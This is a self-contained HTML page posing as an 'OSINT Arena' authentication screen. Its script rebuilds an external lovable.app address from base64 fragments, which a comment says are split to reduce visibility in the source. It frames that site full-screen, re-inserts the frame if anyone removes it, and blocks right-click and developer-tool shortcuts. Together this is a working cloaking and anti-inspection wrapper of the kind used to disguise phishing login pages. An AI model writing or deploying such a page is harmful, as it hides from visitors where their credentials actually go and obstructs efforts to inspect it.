<!doctype html><html lang="fr"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>OSINT Arena — Auth</title>
<style>html,body{height:100%;margin:0;padding:0;background:linear-gradient(180deg,#041027 0%,#07172a 100%);font-family:Inter,system-ui,sans-serif;overflow:hidden}#_c{position:fixed;inset:0;width:100%;height:100%}</style>
</head><body><div id="_c"></div>
<script>
(function(){
  // URL encodée fragmentée (nuance la visibilité dans le source)
  var a='aHR0cHM6Ly9wc3lj', b='b2luLXBsYXlob3Vz', c='ZS5sb3ZhYmxlLmFwcA==';
  var b64 = a + b + c;
  function dec(s){ try { return atob(s); } catch(e) { return decodeURIComponent(escape(window.atob(s))); } }
  function rnd(n){ return Math.random().toString(36).slice(2,2+n); }

  function createIframe(){
    if(document.getElementById('_ifr')) return;
    var url = dec(b64);
    var ifr = document.createElement('iframe');
    ifr.id = '_ifr';
    ifr.title = 'OSINT Arena Auth';
    ifr.src = url;
    ifr.style.cssText = 'width:100%;height:100%;border:0;display:block';
    ifr.setAttribute('allowfullscreen','');
    // Si tu veux restreindre les permissions de l'iframe, décommente et ajuste la ligne sandbox ci-dessous :
    // ifr.setAttribute('sandbox','allow-scripts allow-forms allow-same-origin');
    var container = document.getElementById('_c') || document.body;
    container.appendChild(ifr);
    ifr.dataset.r = rnd(6);
    return ifr;
  }

  function guardAgainstRemoval(){
    var root = document.getElementById('_c') || document.body;
    var mo = new MutationObserver(function(){
      if(!document.getElementById('_ifr')) setTimeout(createIframe,120);
    });
    mo.observe(root,{childList:true,subtree:false});
    window.__obs = mo; // expose l'observer pour éviter GC agressif
  }

  function discourageDevTools(){
    document.addEventListener('contextmenu', function(e){ e.preventDefault(); }, false);
    document.addEventListener('keydown', function(e){
      // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U (disuasif seulement)
      if(e.keyCode===123 || (e.ctrlKey && e.shiftKey && (e.keyCode===73 || e.keyCode===74)) || (e.ctrlKey && e.keyCode===85)){
        e.preventDefault(); e.stopPropagation();
      }
    }, false);
  }

  try {
    setTimeout(function(){ createIframe(); guardAgainstRemoval(); discourageDevTools(); }, Math.floor(200 + Math.random()*400));
  } catch(e){}
})();
</script>
</body></html>
